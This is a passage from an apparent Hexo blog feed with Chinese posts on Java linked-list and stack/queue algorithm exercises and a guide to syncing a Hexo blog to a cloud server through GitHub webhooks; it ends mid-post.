      <url>/2022/11/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E9%93%BE%E8%A1%A8%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="第二章：链表问题"><a href="#第二章：链表问题" class="headerlink" title="第二章：链表问题"></a>第二章：链表问题</h1><h2 id="打印两个有序链表的公共部分"><a href="#打印两个有序链表的公共部分" class="headerlink" title="打印两个有序链表的公共部分"></a>打印两个有序链表的公共部分</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 给定两个有序链表的头指针head1和head2,打印两个链表的公共部分</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> head1</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> head2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printCommonPart</span><span class="params">(Node head1,Node head2)</span> &#123;</span><br><span class="line">    <span class="comment">// 有序 则说明，我们可以用双指针思想，找到相同的点</span></span><br><span class="line">    <span class="keyword">while</span> (head1 != <span class="literal">null</span> &amp;&amp; head2 != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (head1.value &gt; head2.value) &#123;</span><br><span class="line">            head1 = head1.next;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (head1.value &lt; head2.value) &#123;</span><br><span class="line">            head2 = head2.next;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果相等，说明到达了公共节点</span></span><br><span class="line">            System.out.println(head1.value);</span><br><span class="line">            head1 = head1.next;</span><br><span class="line">            head2 = head2.next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="在单链表和双链表中删除倒数第K个节点"><a href="#在单链表和双链表中删除倒数第K个节点" class="headerlink" title="在单链表和双链表中删除倒数第K个节点"></a>在单链表和双链表中删除倒数第K个节点</h2><blockquote><p>单链表</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 单链表删除倒数第k个节点</span></span><br><span class="line"><span class="comment"> * 假如链表长度为N，则删除倒数第K个点，就需要找到倒数K点的前一个点，也就是N-K位置</span></span><br><span class="line"><span class="comment"> * 我们每遍历一个点，k-1</span></span><br><span class="line"><span class="comment"> * 这里需要想一下，比如：</span></span><br><span class="line"><span class="comment"> * 1-&gt;2-&gt;3 k=4 : 3 2 1 ,发现最终k&gt;0 说明倒数第K个点，已经超出范围了</span></span><br><span class="line"><span class="comment"> * 1-&gt;2-&gt;3 k=3 : 2 1 0 ,发现k=0, 说明删除的就是头结点，返回头结点下一个</span></span><br><span class="line"><span class="comment"> * 1-&gt;2-&gt;3 k=2 : 1 0 -1,k&lt;0, 说明删除的点在中间 这时候我们从头遍历，K+1，则第一遍遍历为K-N,则第二遍当K=0时，则就是遍历到N-K的位置</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> head</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> lastKth</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Node <span class="title function_">removeLastKthNode</span><span class="params">(Node head,<span class="type">int</span> lastKth)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span> || lastKth &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;输入参数有误&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 这里用一个指针遍历，因为第二遍我们还需要找到头结点</span></span><br><span class="line">    <span class="type">Node</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">    <span class="keyword">while</span> (cur != <span class="literal">null</span>) &#123;</span><br><span class="line">        lastKth--;</span><br><span class="line">        cur = cur.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (lastKth &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;删除结点超出范围&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (lastKth == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> head.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 这里就剩下 K &lt; 0 情况</span></span><br><span class="line">    cur = head;</span><br><span class="line">    <span class="keyword">while</span> (lastKth != <span class="number">0</span>) &#123;</span><br><span class="line">        lastKth++;</span><br><span class="line">        cur = cur.next;</span><br><span class="line">    &#125;</span><br><span class="line">    cur.next = cur.next == <span class="literal">null</span> ? <span class="literal">null</span> : cur.next.next;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>双链表</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 双链表结构与单链表就是多了个前指针，我们在删除时需要注意</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> head</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> lastKth</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Node <span class="title function_">removeLastKthNode</span><span class="params">(Node head, <span class="type">int</span> lastKth)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span> || lastKth &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;参数异常&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Node</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">    <span class="keyword">while</span> (cur != <span class="literal">null</span>) &#123;</span><br><span class="line">        lastKth--;</span><br><span class="line">        cur = cur.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (lastKth == <span class="number">0</span>) &#123;</span><br><span class="line">        head = head.next;</span><br><span class="line">        head.before = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (lastKth &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        cur = head;</span><br><span class="line">        <span class="keyword">while</span> (lastKth != <span class="number">0</span>) &#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">            lastKth++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 当前就找到了要删除的点</span></span><br><span class="line">        cur.next = cur.next.next;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">tmp</span> <span class="operator">=</span> cur.next;</span><br><span class="line">        <span class="keyword">if</span> (tmp != <span class="literal">null</span>) &#123;</span><br><span class="line">            tmp.before = cur;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="删除链表的中间节点"><a href="#删除链表的中间节点" class="headerlink" title="删除链表的中间节点"></a>删除链表的中间节点</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 删除中间节点：</span></span><br><span class="line"><span class="comment"> * 1-&gt;2 删除 1</span></span><br><span class="line"><span class="comment"> * 1-&gt;2-&gt;3 删除 2</span></span><br><span class="line"><span class="comment"> * 问题的关键就是要找到中间这个点，通过前一个点进行删除</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> head</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Node <span class="title function_">removeMidNode</span><span class="params">(Node head)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 利用快慢指针，快指针一次走两步，慢指针一次走一步</span></span><br><span class="line">  <span class="comment">// 这里快指针先走一步，则最终slow的下一个点就是中间点</span></span><br><span class="line">    <span class="type">Node</span> <span class="variable">fast</span> <span class="operator">=</span> head.next.next;</span><br><span class="line">    <span class="type">Node</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">    <span class="keyword">while</span> (fast.next != <span class="literal">null</span> &amp;&amp; fast.next.next != <span class="literal">null</span>) &#123;</span><br><span class="line">        slow = slow.next;</span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">    slow.next = slow.next.next;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="反转单向和双向链表"><a href="#反转单向和双向链表" class="headerlink" title="反转单向和双向链表"></a>反转单向和双向链表</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 反转单向链表</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> head</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Node <span class="title function_">reverseList</span><span class="params">(Node head)</span> &#123;</span><br><span class="line">    <span class="type">Node</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">Node</span> <span class="variable">next</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">while</span> (head != <span class="literal">null</span>) &#123;</span><br><span class="line">        next = head;</span><br><span class="line">        head = head.next;</span><br><span class="line">        next.next = pre;</span><br><span class="line">        pre = next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 反转双向链表</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> head</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Node <span class="title function_">reverseList</span><span class="params">(Node head)</span> &#123;</span><br><span class="line">    <span class="type">Node</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">Node</span> <span class="variable">next</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">while</span> (head != <span class="literal">null</span>) &#123;</span><br><span class="line">        next = head.next;</span><br><span class="line">        head.next = pre;</span><br><span class="line">        head.before = next;</span><br><span class="line">        pre = head;</span><br><span class="line">        head = next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pre;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo d 推送至服务器</title>
      <link href="/2022/11/28/Hexo%E5%90%8C%E6%AD%A5%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2022/11/28/Hexo%E5%90%8C%E6%AD%A5%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Hexo-d-推送至服务器"><a href="#Hexo-d-推送至服务器" class="headerlink" title="Hexo d 推送至服务器"></a>Hexo d 推送至服务器</h1><p>​    前段时间利用Hexo搭建博客，并配合GitHub page进行页面显示，一切都很美妙，但有一个问题就是访问速度太慢，后面我希望将博客迁移到腾讯云中，之后就从服务器访问了。现在关于Hexo搭建基本博客的帖子已经很详细了，所以我会放一些我参考的链接，主要介绍如何从本地将文件同步到自己的服务器中。</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="Hexo博客搭建"><a href="#Hexo博客搭建" class="headerlink" title="Hexo博客搭建"></a>Hexo博客搭建</h3><p>三水同学的笔记：<a href="https://sanshui.vip/2022/08/10/indexday1/">https://sanshui.vip/2022/08/10/indexday1/</a>  （这里操作完，基本上就是博客雏形和Github page的显示）</p><h3 id="Butterfly主题"><a href="#Butterfly主题" class="headerlink" title="Butterfly主题"></a>Butterfly主题</h3><p>有了基本的博客雏形，但样式比较单一，这时候就可以利用现有的Hexo主题，这里只列举了Butterfly，还有些其他主题，可以自行查找。</p><p>推荐教程：<a href="https://www.fomal.cc/posts/4aa2d85f.html">https://www.fomal.cc/posts/4aa2d85f.html</a>  （这里操作完，样子就会好看许多，剩下的就是页面的修改，按照自己的意愿）</p><h3 id="页面音乐播放"><a href="#页面音乐播放" class="headerlink" title="页面音乐播放"></a>页面音乐播放</h3><p>我当时觉得博客加点儿音乐很有感觉，就捣鼓了些。</p><p>推荐教程：<a href="https://blog.csdn.net/qq_41467882/article/details/124734598">https://blog.csdn.net/qq_41467882/article/details/124734598</a></p><h2 id="博客同步"><a href="#博客同步" class="headerlink" title="博客同步"></a>博客同步</h2><p>前面的步骤里，只有Hexo博客搭建是必须的，另外两个都是为了美化，那我们先说如何从本地同步到Github page。</p><ol><li><code>hexo g</code> : 生成静态页面</li><li><code>hexo d</code> : hexo帮你部署，这里需要在_config.yml中配置地址即可，上面的教程有讲</li></ol><p>我之前遇到个问题，以为<code>hexo g</code>只用生成一次即可，后面修改完直接<code>hexo d</code>,实际上需要每次都要执行这两步，因为需要根据你修改的文章，生成新的静态页面，再上传。这里我嫌麻烦在<code>package.json</code>中写了新的选项来一次执行两步：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">  <span class="comment">// 这里以后就可以用 yarn upload 来执行两步</span></span><br><span class="line">  <span class="string">&quot;upload&quot;</span>: <span class="string">&quot;hexo generate &amp;&amp; hexo deploy&quot;</span>,</span><br><span class="line">  <span class="string">&quot;build&quot;</span>: <span class="string">&quot;hexo generate&quot;</span>,</span><br><span class="line">  <span class="string">&quot;clean&quot;</span>: <span class="string">&quot;hexo clean&quot;</span>,</span><br><span class="line">  <span class="string">&quot;deploy&quot;</span>: <span class="string">&quot;hexo deploy&quot;</span>,</span><br><span class="line">  <span class="string">&quot;server&quot;</span>: <span class="string">&quot;hexo server&quot;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>​    说完上面的了，你的博客就已经可以通过本地修改，通过到Github page中，但有些问题：</p><ol><li>同步上去后，Github page显示会有延迟</li><li>普通用户会加载的很慢，影响体验</li></ol><p>​    所以这里我尝试着迁移到自己的服务器中，以后直接通过Nginx访问服务器的静态博客页面，这里就牵扯到了购买服务器和域名（非必要），服务器没必要买很大的，因为只是简单的做博客效果，一般最小的轻量级服务器都可以。域名的话就是访问方便， 除非你乐意给别人发IP地址访问。这里都是比较简单的操作，直接去阿里云，腾讯云或者其他的厂商官网查看。</p><blockquote><p>到这里我假设你已经可以通过IP地址/域名访问到Nginx了。那我们如何进行数据迁移呢？</p></blockquote><p>​    最初我在想有没有插件可以直接通过<code>hexo d</code>直接部署到服务器指定位置中，确实有，但是我一直显示连接异常，后选择其他方式。也就是通过<code>github</code>的<code>WebHooks</code>功能。</p><p>​    大致思路为： <code>hexo d</code> 推送代码到<code>github</code>仓库，当<code>WebHooks</code>监测到有pull事件，将发送一条命令通知服务器，然后服务器触发脚本，拉取最新<code>git</code>代码。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8kokpdj63j30dc0810sy.jpg" alt="image-20221128112850056"></p><ol><li>下载go  : <code>yum install -y golang </code></li><li>设置代理 : <code>go env -w GOPROXY=[https://goproxy.cn](https://goproxy.cn/),direct</code>  否则用go访问会老超时</li><li>查看go环境，看是否代理修改了 : <code>go env</code></li><li>安装WebHooks : <code>go get github.com/adnanh/webhook</code></li><li>编写shell脚本，主要作用就是拉取<code>git</code>仓库代码，如果你前面已经在服务器自己博客文件目录中<code>git clone</code>，克隆Github文件了，这里之后就可以直接用<code>git pull</code>了</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">cd /home/blog/GMaya   # 这里就是你自己打算存放博客的目录，可以自己定义</span><br><span class="line">git pull</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="6"><li>编写<code>hooks.json</code>文件，就放在上一个文件下面就行</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;随便自定义&quot;</span>,</span><br><span class="line">    <span class="string">&quot;execute-command&quot;</span>: <span class="string">&quot;webhook.sh&quot;</span>, # 这里是你脚本的名字，就是上面的文件</span><br><span class="line">    <span class="string">&quot;command-working-directory&quot;</span>: <span class="string">&quot;/home/hook&quot;</span> # 这里是你脚本存放的地址</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><ol start="7"><li>后台启动</li></ol><p><code>nohup /root/go/bin/webhook -hooks /上面定义的地址/hooks.json -verbose &amp;</code></p><ol start="8"><li>查看日志</li></ol><p><code>tail -f nohup.out</code></p><p>正常显示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[webhook] 2021/01/30 00:10:53 version 2.8.0 starting</span><br><span class="line">[webhook] 2021/01/30 00:10:53 setting up os signal watcher</span><br><span class="line">[webhook] 2021/01/30 00:10:53 attempting to load hooks from /home/hook/hooks.json</span><br><span class="line">[webhook] 2021/01/30 00:10:53 found 1 hook(s) in file</span><br><span class="line">[webhook] 2021/01/30 00:10:53 loaded: gmaya-hooks</span><br><span class="line">[webhook] 2021/01/30 00:10:53 serving hooks on http://0.0.0.0:9000/hooks/&#123;id&#125;</span><br><span class="line">[webhook] 2021/01/30 00:10:53 os signal watcher ready</span><br></pre></td></tr></table></figure><p>​    注意：这里可以看到是根据9000端口通信的，所以一方面需要在服务器打开防护墙端口，一方面在你的服务器厂商那里打开防火墙或者什么安全设置。这里我用的腾讯云，直接在轻量服务器里加入9000端口的设置即可。</p><p>​    现在你的服务器就已经监听Github了，但Github还不知道你的服务器。</p><ol start="9"><li>github上配置钩子</li></ol><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8kozlqqbpj317v0jadi2.jpg" alt="image-20221128114311505"></p><p>填入Payload URL：<code>http://ip:9000/hooks/上面你自己定义的ID，在hooks.json</code></p><p>添加好后，就可以直接从本地同步到Github上，当Github上发生修改，服务器就会被触发执行脚本，拉取最新的代码。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一章：栈与队列</title>
      <link href="/2022/11/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%EF%BC%9A%E6%A0%88%E4%B8%8E%E9%98%9F%E5%88%97/"/>
      <url>/2022/11/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%EF%BC%9A%E6%A0%88%E4%B8%8E%E9%98%9F%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h1 id="第一章：栈与队列"><a href="#第一章：栈与队列" class="headerlink" title="第一章：栈与队列"></a>第一章：栈与队列</h1><h2 id="设计一个有getMin功能的栈"><a href="#设计一个有getMin功能的栈" class="headerlink" title="设计一个有getMin功能的栈"></a>设计一个有getMin功能的栈</h2><blockquote><p>要求：pop，push，getMin的时间复杂度为：O(1)</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">stackTemplate</span> &#123;</span><br><span class="line">    <span class="comment">// 记录插入值</span></span><br><span class="line">    <span class="keyword">private</span> Stack&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// 记录插入值的最小值</span></span><br><span class="line">    <span class="keyword">private</span> Stack&lt;Integer&gt; minStack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line">        stack.push(value);</span><br><span class="line">        <span class="comment">// 如果最小值栈的栈顶元素 大于 当前元素，则说明有新的最小值了，</span></span><br><span class="line">        <span class="keyword">if</span> (minStack.isEmpty() || minStack.peek() &gt;= value) &#123;</span><br><span class="line">            minStack.push(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;栈为空&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">pop</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">        <span class="keyword">if</span> (pop &lt;= minStack.peek()) &#123;</span><br><span class="line">            minStack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pop;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getMin</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> minStack.peek();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> stack.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="由两个栈组成的队列"><a href="#由两个栈组成的队列" class="headerlink" title="由两个栈组成的队列"></a>由两个栈组成的队列</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">myQueue</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Stack&lt;Integer&gt; inStack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> Stack&lt;Integer&gt; outStack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> inStack.isEmpty() &amp;&amp; outStack.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line">        inStack.push(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">pop</span><span class="params">()</span> 